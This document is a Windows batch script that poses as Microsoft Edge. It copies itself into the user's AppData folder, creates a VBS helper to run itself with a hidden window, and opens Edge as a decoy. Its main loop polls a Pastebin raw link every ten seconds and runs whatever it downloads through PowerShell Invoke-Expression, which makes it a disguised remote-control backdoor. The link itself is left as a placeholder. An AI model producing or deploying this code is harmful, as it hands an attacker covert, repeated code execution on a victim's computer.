@echo off
title MicrosoftEdge
::PASTEBIN RAW LINK
set "raw_link=LINK"
::PASTEBIN RAW LINK

setlocal enabledelayedexpansion
set "batch_location=%~dp0"
set "batch_name=%~nx0"
if exist "%appdata%\MicrosoftEdge\" (
  echo.
) else (
    md "%appdata%\MicrosoftEdge\"
)

if "%batch_location%"=="%appdata%\MicrosoftEdge\" (
  echo.
) else (
  if exist "%appdata%\MicrosoftEdge\MicrosoftEdge.bat" (
    echo.
  ) else (
    xcopy "%batch_location%%batch_name%" "%appdata%\MicrosoftEdge\"
    ren %appdata%\MicrosoftEdge\%batch_name% MicrosoftEdge.bat
  )
)
if exist "%appdata%\MicrosoftEdge\inv.vbs" (
  goto root
) else (
echo CreateObject("WScript.Shell"^).Run "%appdata%\MicrosoftEdge\inv.vbs 1", 0, False > "%appdata%\MicrosoftEdge\inv.vbs"
  start msedge
)
endlocal

exit

:root
if "%batch_location%"=="%appdata%\MicrosoftEdge\" (
  echo.
) else (
start msedge
exit
)
if "%1"=="" (
  start msedge
  exit
) else (
echo.
)

if exist hash.txt (
set /p previous_hash=<"hash.txt"
) else (
set "previous_hash="
)

:monitor_loop
echo Checking for updates...
powershell -Command "Invoke-RestMethod -Uri '%raw_link%' | ForEach-Object { $_ } | Out-File -FilePath temp.txt -Encoding UTF8"
powershell -Command "$hash = Get-FileHash -Path 'temp.txt' -Algorithm SHA256; echo $hash.Hash" > hash.txt
set /p current_hash=<hash.txt
if "%current_hash%" NEQ "%previous_hash%" (
  echo Done
  powershell -Command "Get-Content temp.txt | Invoke-Expression"
  set "previous_hash=%current_hash%"
)

del temp.txt
timeout /t 10 /nobreak >nul

goto monitor_loop
